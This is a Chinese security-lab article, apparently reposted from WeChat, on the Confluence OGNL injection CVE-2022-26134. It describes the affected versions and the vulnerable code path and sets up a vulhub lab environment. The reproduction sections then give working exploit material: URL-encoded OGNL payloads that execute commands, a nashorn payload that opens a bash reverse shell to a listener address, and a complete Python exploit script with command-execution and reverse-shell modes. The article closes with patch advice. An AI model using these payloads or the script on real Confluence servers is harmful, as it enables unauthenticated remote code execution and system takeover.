> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FQnmzGIgC2co9JWiSHum5w)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrynhicSC9oWDibJEW3BUhEIWManZGCkeyNxMv9pQzctc5ZF2mlFAnYQegWvg559w1Gw4nJndYHQaJUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

戟星安全实验室

  

    忆享科技旗下高端的网络安全攻防服务团队.安服内容包括渗透测试、代码审计、应急响应、漏洞研究、威胁情报、安全运维、攻防演练等

  

本文约5700字，阅读约需10分钟。

  

---

![图片](https://mmbiz.qpic.cn/mmbiz_png/d9sDSQY0N3dbCROIuExpEeqCjVGHq25FMzOcI8PNpoS150MiaeAwYE16aKLckDjHHWanRc1rXlLeYJ21SARXdGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0x00 漏洞描述**

  

在受影响的 Confluence Server 和 Data Center 版本中，存在一个 OGNL表达式注入漏洞，该漏洞允许未经身份验证的攻击者在 Confluence Server 或 Data Center 实例上执行任意代码。  

  

---

![图片](https://mmbiz.qpic.cn/mmbiz_png/d9sDSQY0N3dbCROIuExpEeqCjVGHq25FMzOcI8PNpoS150MiaeAwYE16aKLckDjHHWanRc1rXlLeYJ21SARXdGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0x01 影响版本**

```
`Confluence Server and Data Center >= 1.3.0``Confluence Server and Data Center < 7.4.17``onfluence Server and Data Center < 7.13.7``Confluence Server and Data Center < 7.14.3``Confluence Server and Data Center < 7.15.2``Confluence Server and Data Center < 7.16.4``Confluence Server and Data Center < 7.17.4``Confluence Server and Data Center < 7.18.1`
```

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/d9sDSQY0N3dbCROIuExpEeqCjVGHq25FMzOcI8PNpoS150MiaeAwYE16aKLckDjHHWanRc1rXlLeYJ21SARXdGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0x02 漏洞分析**

  

通过官方给出的修复方案可以看出漏洞触发点应该是在 xwork 这个jar包里，通过对比其中的 xwork 组件发现在idea中在 final OgnlValueStack stack = ActionContext.getContext().getValueStack();这一行打个断点，执行payload触发命令执行，发现执行成功，再通过查看调用栈发现requestDispatcherPath 变为/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(“whoami”).getInputStream(),“utf-8”)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(“X-Response”,#a))}/index.action

函数invoke尝试通过next获取下一个拦截器对象，然后调用其intercept方法，大部分Interceptor对象的intercept函数格式,继续调用DefaultActionInvocation#invoke，从而形成迭代循环。但是在调试中我们发现也有特殊的一些Interceptor,比如ConfluenceAccessInterceptor,当满足一定条件时并不会继续调用DefaultActionInvocation#invoke，而是返回字符串notpermitted,主要是通过请求的*.action和methdName，来判断当前用户currentUser是否有访问权限。也就是说，当访问一个无权访问的*.action时,DefaultActionInvocation#invoke在迭代调用到ConfluenceAccessInterceptor#intercept后，将返回notpermitted并赋值给resultCode，从而跳出迭代。我们替换测试请求为/index.action。

  

当处理到ConfluenceAccessInterceptor拦截器时，将不会继续迭代调用下一个拦截器，而是继续往下走，进入executeResult函数,进入ActionChainResult#execute 提取namespace参数，并调用translateVariables函数,OGNL 表达式解析过程，前面分析中可知,namespace参数通过ServletDispatcher#getNameSpace函数获取,可见namespace取值为请求servletPath最后一个/之前的部分,根据上面正则表达式规则，要想触发 OGNL 解析，我们很容易构造出相应的 URL【所以进行url编码】 成功触发 OGNL 表达式注入。

  

---

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**0x03 漏洞复现**

  

<table cellspacing="0" cellpadding="0" align="left" width="594"><thead><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;height:20.5pt;"><td style="padding: 0.75pt;" height="20"><p style="text-align:center;mso-pagination:
   widow-orphan;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:
   around;mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:
   page;mso-element-left:.2pt;mso-element-top:44.8pt;mso-height-rule:exactly;"><strong><span style="font-size:12.0pt;font-family:宋体;mso-bidi-font-family:宋体;mso-font-kerning:
   0pt;mso-bidi-language:AR;">组件</span></strong></p></td><td style="padding: 0.75pt;" height="20"><p style="text-align:center;mso-pagination:
   widow-orphan;mso-element:frame;mso-element-frame-hspace:9.0pt;mso-element-wrap:
   around;mso-element-anchor-vertical:paragraph;mso-element-anchor-horizontal:
   page;mso-element-left:.2pt;mso-element-top:44.8pt;mso-height-rule:exactly;"><strong><span style="font-size:12.0pt;font-family:宋体;mso-bidi-font-family:宋体;mso-font-kerning:
   0pt;mso-bidi-language:AR;">版本</span></strong></p></td></tr></thead><tbody><tr style="mso-yfti-irow:1;height:20.5pt;"><td style="padding: 0.75pt;" height="25"><section style="text-align: left;text-indent: 2em;">kali</section></td><td style="padding: 0.75pt;" height="25"><br></td></tr><tr style="mso-yfti-irow:2;mso-yfti-lastrow:yes;height:20.5pt;"><td style="padding: 0.75pt;" height="20"><p style="text-align: left;text-indent: 2em;">vulhub-master</p></td><td style="padding: 0.75pt;" height="20"><br></td></tr></tbody></table>

### **基础环境**

启动漏洞环境：

```
cd /vulhub-master/confluence/CVE-2022-26134
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
sudo dockers-compose up -d
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

环境启动后访问`http://your-ip:8090`，会进入安装引导，之后会要求填写`license key`。点击`“Get an evaluation license”`，去`Atlassian`官方申请一个`Confluence Server`的测试证书

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPR9RxjuMk2TxF9VTPnstJgqSZsEyJjUd9DjqHqaqgkFpaBibeI1ic0ddg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

填写邮箱后会发送一条邮件，然后按步骤完成注册

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPf98r57K4Zr6vl7TyvHXCqYIZ74oVUfI1d8FAAUDEzvibzp1Hv3egcCA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdP3giaibjwFjavicYtiaDOxnvqe4xZ4Es8WCane6BQibwpHic3ERsSegBAalOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

注册完毕后获取`key`

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPOCgG7RzwJdCr9hMDichabc7wSibVcOqDLibicyQWwfgGp5hJwGgNoRosmw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

得到`key`后，在`http://your-ip:8090`界面输入`key`：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdP2Nc6WibUu7MZw4bo1dtumXWwLjPTUNc9oRviaj8MiaWG8z2rGGZncNSxQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdP59Hx0icdce1iczl1cyTT7EXCYlEkUT7f0Pf0oH2UbqNzlDicxJnunKjUA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

跳转到填写数据库信息的页面，`PostgreSQL`数据库地址为`db`，数据库名称`confluence`，用户名密码均为`postgres`

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPyJPjMXgdYdg19HhibDPHSdE079d0QMH4V6zTr4iakoXKEbJbABOTsSdQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPdcsiaOtBAfT523SA2Qtbk4Gaw3tY5xQzo4IM0992BnicnzhD4f8liaUZA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPABbiaHRQ4M60Y2HiadLZ9RicoFib5eicuoHlV1J47b6LeLzR7otiat5psxvQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

搭建成功，返回登录

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPzD1IZ1H1SrHhwW0nf7sbeXLAY5AEWQhUzAZqkpelMicltXoHTHvdjwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### **漏洞验证**

使用burpsuite抓包，修改OGNL表达式,使用url进行编码且构造数据包

```
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

  

```
`GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1``Host: 192.168.42.71:8090``Cache-Control: max-age=0``Upgrade-Insecure-Requests: 1``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9``Accept-Encoding: gzip, deflate``Accept-Language: zh-CN,zh;q=0.9``Cookie: JSESSIONID=1BCE0EF1C47E7DCAECF490BF52AAE968``Connection: close`
```

发现响应中显示代码执行的结果

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPEM4zXzRfjOSPG5w06b6YPPY4uRdOVbeMiayCM8g0S61UwTdic2AIibFew/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxh12gwKNxicj2YMdSne9DdPVemXKkS1xlww5moEGgk28ooicnIuT74kVCbV0SSBzjoicoXne8jnxHUA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

### **深度利用**

#### getshell

攻击payload，且进行url编码改包

```
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/ tcp/192.168.42.71/7777 0>&1').start()")}
```

  

```
`GET /%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.42.71/7777%200%3E%261%27%29.start%28%29%22%29%7D/ HTTP/1.1``Host: 192.168.42.71:8090``Cache-Control: max-age=0``Upgrade-Insecure-Requests: 1``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9``Accept-Encoding: gzip, deflate``Accept-Language: zh-CN,zh;q=0.9``Cookie: JSESSIONID=1BCE0EF1C47E7DCAECF490BF52AAE968``Connection: close`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

exp反弹shell

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### **EXP 编写**

```
`#!/usr/bin/python3` `# coding: utf-8` `# cve2022-26134` `# by: lxxl` `import urllib` `import requests` `import re` `import sys` `from bs4 import BeautifulSoup` `import urllib3` `urllib3.disable_warnings()` `import argparse` `def check(url):` `r = requests.get(url + "/login.action", verify=False)` `if (r.status_code == 200):` `filter_version = re.findall("<span id='footer-build-information'>.*</span>", r.text)` `if (len(filter_version) >= 1):` `version = filter_version[0].split("'>")[1].split('</')[0]` `return version` `else:` `return False` `else:` `return url` `def exploit(url, command):` `headers = {` `'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',` `'Content-Type': 'application/x-www-form-urlencoded',` `'Accept': '*/*',` `}` `r = requests.get(` `url + '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + command + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/',` `headers=headers, verify=False, allow_redirects=False)` `if (r.status_code == 302):` `return r.headers['X-Cmd-Response']` `else:` `return False` `def shell():` `shell = ip + "/" + port` `shell1 = "'bash','-c','bash -i >& "` `exp = shell1 + "/dev/tcp/"  + shell + " 0>&1'"` `payload1 = '''${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('''` `payload2 = exp + ''').start()")}/'''` `payloads = payload1 + payload2` `s = urllib.parse.quote(payloads)` `return s` `if __name__ == "__main__":` `parser = argparse.ArgumentParser(description='cve2022-26134')` `parser.add_argument('-u', '--url', help='target url', required=False)` `parser.add_argument('-c', '--command', help='command', required=False)` `parser.add_argument('-i', '--lhost', help='type', required=False)` `parser.add_argument('-p', '--lport', help='type', required=False)` `args = parser.parse_args()` `cmd = args.command` `ip = args.lhost` `port = args.lport` `if (len(sys.argv) < 3):` `print("USE: python3 " + sys.argv[0] + " -u https://target.com -c command")` `print("ex: python3 " + sys.argv[0] + " -u https://target.com -i  your.ip -p your.port")` `if (sys.argv[3] == "-i"):` `target = args.url` `ip = args.lhost` `port = args.lport` `e = requests.get(target + shell())` `if e.status_code == 200 or e.status_code == 302:` `print("[+] exploit success")` `else:` `print("[-] exploit failed")` `else:` `target = args.url` `cmd = cmd.replace("'", "")` `version = check(target)` `print("============ GET Confluence Version ============")` `if (version):` `print("Version: " + version)` `else:` `print("Version: Not Found")` `print(exploit(target, cmd))`
```

  

---

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**0x04 修复建议**

  

升级Atlassian Confluence Server and Data Center至安全版本。

临时缓解方案：下载官方发布的xwork-1.0.3-atlassian-10.jar替换confluence/WEB-INF/lib/目录下原来的xwork jar文件，并重启Confluence。

  

 声明

    由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，戟星安全实验室及文章作者不为此承担任何责任。

    戟星安全实验室拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经戟星安全实验室允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

戟星安全实验室

# 长按二维码 关注我们 #